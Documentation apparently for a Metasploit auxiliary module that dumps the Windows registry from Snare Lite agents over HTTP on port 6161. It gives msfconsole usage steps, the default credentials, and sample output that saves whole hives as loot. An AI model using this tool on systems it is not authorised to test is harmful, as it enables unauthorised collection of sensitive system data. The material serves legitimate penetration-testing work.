## Description

  This module uses the Registry Dump feature of the [Snare Lite for Windows](https://sourceforge.net/projects/snare/) HTTP service on 6161/TCP to retrieve the Windows registry. The Registry Dump functionality is unavailable in Snare Enterprise.

  **Note: The Registry Dump functionality accepts only one connected client at a time. Requesting a large key/hive will cause the service to become unresponsive until the server completes the request.**


## Vulnerable Application

  SNARE (System iNtrusion Analysis and Reporting Environment) is a series of log collection agents that facilitate centralised analysis of audit log data.

  This module has been tested successfully with Snare Lite for Windows version 4.0.2.0 on Windows XP SP3.

  Snare Lite for Windows is no longer supported, however a [free trial is available](http://www.snarealliance.com/snare-open-source-agent-downloads-submission/) from the Snare Alliance website.


## Verification Steps

  1. Start `msfconsole`
  2. Do: `use auxiliary/gather/snare_registry`
  3. Do: `set rhost [IP]`
  4. Do: `set HttpUsername [USERNAME]`
  5. Do: `set HttpPassword [PASSWORD]`
  6. Do: `run`
  7. You should get a copy of *HKLM\HARDWARE\DESCRIPTION\System* from the remote Windows system


## Options

**HttpUsername**

The username for Snare remote access (default: `snare`).

**HttpPassword**

The password for Snare remote access (default: blank).

**REG_DUMP_KEY**

Retrieve the specified registry key and all sub-keys.

**REG_DUMP_ALL**

Retrieve the entire Windows registry.

**TIMEOUT**

Timeout in seconds for downloading each registry key/hive.


## Scenarios

Retrieve a specific registry key:

  ```
  msf auxiliary(snare_registry) > set REG_DUMP_KEY HKLM\\HARDWARE\\DESCRIPTION\\System
  REG_DUMP_KEY => HKLM\HARDWARE\DESCRIPTION\System
  msf auxiliary(snare_registry) > run

  [*] 192.168.18.155:6161 - Retrieving registry key 'HKLM\\HARDWARE\\DESCRIPTION\\System'...
  [+] 192.168.18.155:6161 - Retrieved key successfully (23092 bytes)
  [+] File saved in: /root/.msf4/loot/20151225133011_default_192.168.18.155_snare.registry_842138.txt
  [*] Auxiliary module execution completed
  ```

Retrieve an entire hive:

  ```
  msf auxiliary(snare_registry) > set REG_DUMP_KEY HKLM
  REG_DUMP_KEY => HKLM
  msf auxiliary(snare_registry) > run

  [*] 192.168.18.155:6161 - Retrieving registry hive 'HKLM'...
  [+] 192.168.18.155:6161 - Retrieved key successfully (10657975 bytes)
  [+] File saved in: /root/.msf4/loot/20151225133147_default_192.168.18.155_snare.registry_247207.txt
  [*] Auxiliary module execution completed
  ```

Retrieve the entire registry:

  ```
  msf auxiliary(snare_registry) > set REG_DUMP_ALL true
  REG_DUMP_ALL => true
  msf auxiliary(snare_registry) > run

  [*] 192.168.18.155:6161 - Retrieving list of registry hives ...
  [+] 192.168.18.155:6161 - Found 5 registry hives (HKEY_CLASSES_ROOT, HKEY_CURRENT_CONFIG, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS)
  [*] 192.168.18.155:6161 - Retrieving registry hive 'HKEY_CLASSES_ROOT'...
  [+] 192.168.18.155:6161 - Retrieved key successfully (3933816 bytes)
  [+] File saved in: /root/.msf4/loot/20151225133222_default_192.168.18.155_snare.registry_070659.txt
  [*] 192.168.18.155:6161 - Retrieving registry hive 'HKEY_CURRENT_CONFIG'...
  [+] 192.168.18.155:6161 - Retrieved key successfully (5605 bytes)
  [+] File saved in: /root/.msf4/loot/20151225133222_default_192.168.18.155_snare.registry_376606.txt
  [*] 192.168.18.155:6161 - Retrieving registry hive 'HKEY_CURRENT_USER'...
  [+] 192.168.18.155:6161 - Retrieved key successfully (269927 bytes)
  [+] File saved in: /root/.msf4/loot/20151225133223_default_192.168.18.155_snare.registry_653681.txt
  [*] 192.168.18.155:6161 - Retrieving registry hive 'HKEY_LOCAL_MACHINE'...
  [+] 192.168.18.155:6161 - Retrieved key successfully (11446508 bytes)
  [+] File saved in: /root/.msf4/loot/20151225133336_default_192.168.18.155_snare.registry_003003.txt
  [*] 192.168.18.155:6161 - Retrieving registry hive 'HKEY_USERS'...
  [+] 192.168.18.155:6161 - Retrieved key successfully (1668306 bytes)
  [+] File saved in: /root/.msf4/loot/20151225133342_default_192.168.18.155_snare.registry_236335.txt
  [*] Auxiliary module execution completed
  ```

